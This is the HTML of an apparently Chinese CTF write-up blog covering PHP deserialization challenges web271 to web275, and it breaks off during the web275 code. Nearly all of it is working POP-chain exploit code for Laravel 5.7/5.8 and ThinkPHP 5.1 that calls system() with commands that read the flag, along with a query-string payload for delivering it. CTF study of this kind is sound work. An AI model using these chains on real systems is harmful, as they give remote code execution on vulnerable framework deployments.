web271：</h1>\n<p>​\t\tLaravel 5.7 的反序列化漏洞，源码在这儿：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xhcmF2ZWwvbGFyYXZlbC90cmVlLzUuNyVFMyU4MCU4Mg==\">https://github.com/laravel/laravel/tree/5.7。</span></p>\n<p>​\t\t不大会开发，直接上 poc 算了：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Foundation</span>\\<span class=\"title class_\">Testing</span>&#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Auth</span>\\<span class=\"title class_\">GenericUser</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Foundation</span>\\<span class=\"title\">Application</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PendingCommand</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$command</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$parameters</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$test</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$app</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;command=<span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;parameters[]=<span class=\"string\">&quot;cat /flag&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;test=<span class=\"keyword\">new</span> <span class=\"title class_\">GenericUser</span>();</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;app=<span class=\"keyword\">new</span> <span class=\"title class_\">Application</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Foundation</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">Application</span>&#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">bindings</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;bindings=<span class=\"keyword\">array</span>(</span><br><span class=\"line\">                <span class=\"string\">&#x27;Illuminate\\Contracts\\Console\\Kernel&#x27;</span>=&gt;<span class=\"keyword\">array</span>(</span><br><span class=\"line\">                    <span class=\"string\">&#x27;concrete&#x27;</span>=&gt;<span class=\"string\">&#x27;Illuminate\\Foundation\\Application&#x27;</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">            );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Auth</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">GenericUser</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">attributes</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;attributes[<span class=\"string\">&#x27;expectedOutput&#x27;</span>]=[<span class=\"string\">&#x27;hello&#x27;</span>,<span class=\"string\">&#x27;world&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;attributes[<span class=\"string\">&#x27;expectedQuestions&#x27;</span>]=[<span class=\"string\">&#x27;hello&#x27;</span>,<span class=\"string\">&#x27;world&#x27;</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Foundation</span>\\<span class=\"title class_\">Testing</span>\\<span class=\"title class_\">PendingCommand</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">PendingCommand</span>()));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web272\"><a class=\"markdownIt-Anchor\" href=\"#web272\">#</a> web272：</h1>\n<p>​\t\t上一篇文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlci9hcnRpY2xlL2RldGFpbHMvMTEzODM1MDU3\">laravel5.8 反序列化漏洞复现</span></p>\n<p>​\t\t直接上 poc：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Author</span>: h1xa</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Date</span>:   2021-05-05 22:27:03</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Last</span> Modified by:   h1xa</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Last</span> Modified time: 2021-05-05 22:39:17</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@email</span>: h1xa<span class=\"doctag\">@ctfer</span>.com</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@link</span>: https://ctfer.com</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">PhpParser</span>\\<span class=\"title class_\">Node</span>\\<span class=\"title class_\">Scalar</span>\\<span class=\"title class_\">MagicConst</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">Line</span> &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title class_\">namespace</span> <span class=\"title class_\">Mockery</span>\\<span class=\"title class_\">Generator</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">MockDefinition</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">config</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$code</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$config</span>, <span class=\"variable\">$code</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;config = <span class=\"variable\">$config</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;code = <span class=\"variable\">$code</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Mockery</span>\\<span class=\"title class_\">Loader</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">EvalLoader</span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title class_\">namespace</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Bus</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">Dispatcher</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">queueResolver</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$queueResolver</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;queueResolver = <span class=\"variable\">$queueResolver</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Foundation</span>\\<span class=\"title class_\">Console</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">QueuedCommand</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title class_\">public</span> $<span class=\"title class_\">connection</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$connection</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;connection = <span class=\"variable\">$connection</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Broadcasting</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">PendingBroadcast</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">events</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$event</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$events</span>, <span class=\"variable\">$event</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;events = <span class=\"variable\">$events</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;event = <span class=\"variable\">$event</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">    $<span class=\"title class_\">line</span> = <span class=\"title class_\">new</span> <span class=\"title class_\">PhpParser</span>\\<span class=\"title class_\">Node</span>\\<span class=\"title class_\">Scalar</span>\\<span class=\"title class_\">MagicConst</span>\\<span class=\"title class_\">Line</span>();</span><br><span class=\"line\">    <span class=\"variable\">$mockdefinition</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Mockery\\Generator\\MockDefinition</span>(<span class=\"variable\">$line</span>,<span class=\"string\">&quot;&lt;?php system(&#x27;tac /f*&#x27;);&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$evalloader</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Mockery\\Loader\\EvalLoader</span>();</span><br><span class=\"line\">    <span class=\"variable\">$dispatcher</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Illuminate\\Bus\\Dispatcher</span>(<span class=\"keyword\">array</span>(<span class=\"variable\">$evalloader</span>,<span class=\"string\">&#x27;load&#x27;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$queuedcommand</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Illuminate\\Foundation\\Console\\QueuedCommand</span>(<span class=\"variable\">$mockdefinition</span>);</span><br><span class=\"line\">    <span class=\"variable\">$pendingbroadcast</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Illuminate\\Broadcasting\\PendingBroadcast</span>(<span class=\"variable\">$dispatcher</span>,<span class=\"variable\">$queuedcommand</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$pendingbroadcast</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web273\"><a class=\"markdownIt-Anchor\" href=\"#web273\">#</a> web273：</h1>\n<p>​\t\t用这个 poc：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Broadcasting</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Bus</span>\\<span class=\"title class_\">Dispatcher</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Foundation</span>\\<span class=\"title\">Console</span>\\<span class=\"title\">QueuedCommand</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PendingBroadcast</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$events</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$event</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;events=<span class=\"keyword\">new</span> <span class=\"title class_\">Dispatcher</span>();</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;event=<span class=\"keyword\">new</span> <span class=\"title class_\">QueuedCommand</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Foundation</span>\\<span class=\"title class_\">Console</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">QueuedCommand</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title class_\">public</span> $<span class=\"title class_\">connection</span>=&quot;<span class=\"title class_\">cat</span> /<span class=\"title class_\">flag</span>&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Bus</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">Dispatcher</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">queueResolver</span>=&quot;<span class=\"title class_\">system</span>&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">Illuminate</span>\\<span class=\"title class_\">Broadcasting</span>\\<span class=\"title class_\">PendingBroadcast</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">PendingBroadcast</span>()));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web274\"><a class=\"markdownIt-Anchor\" href=\"#web274\">#</a> web274：</h1>\n<p>​\t\tthinkphp 反序列化，贴个文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjYxOT90aW1lX18xMzExPW40JTJCeG5EMERnNyUzRDd3eFdxR05ubURVeFlxS1F1NUQ1aTVRNXBkeCN0b2MtMQ==\">thinkphp5.1.x~5.2.x 版本反序列化链挖掘分析</span></p>\n<p>​\t\t放个 poc：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>;</span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$append</span> = [];</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;append = [<span class=\"string\">&quot;lin&quot;</span>=&gt;[<span class=\"string\">&quot;calc.exe&quot;</span>,<span class=\"string\">&quot;calc&quot;</span>]];</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&quot;lin&quot;</span>=&gt;<span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>()];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Request</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$hook</span> = [];</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$filter</span> = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = [</span><br><span class=\"line\">        <span class=\"comment\">// 表单ajax伪装变量</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;var_ajax&#x27;</span>         =&gt; <span class=\"string\">&#x27;_ajax&#x27;</span>,  </span><br><span class=\"line\">    ];</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filter = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;config = [<span class=\"string\">&quot;var_ajax&quot;</span>=&gt;<span class=\"string\">&#x27;lin&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;hook = [<span class=\"string\">&quot;visible&quot;</span>=&gt;[<span class=\"variable language_\">$this</span>,<span class=\"string\">&quot;isAjax&quot;</span>]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">process</span>\\<span class=\"title class_\">pipes</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">concern</span>\\<span class=\"title\">Conversion</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">Pivot</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Windows</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$files</span> = [];</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;files=[<span class=\"keyword\">new</span> <span class=\"title class_\">Pivot</span>()];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Model</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">process</span>\\<span class=\"title\">pipes</span>\\<span class=\"title\">Windows</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Windows</span>()));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t然后，将生成的 payload 放在下面的 payload 处：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?data=payload<span class=\"built_in\">&amp;</span>lin=tac /f*</span><br></pre></td></tr></table></figure>\n<p>​\t\t即可得到 flag。</p>\n<h1 id=\"web275\"><a class=\"markdownIt-Anchor\" href=\"#web275\">#</a> web275：</h1>\n<p>​\t\t小声嘀咕：为什么还没有 pop 链？</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span 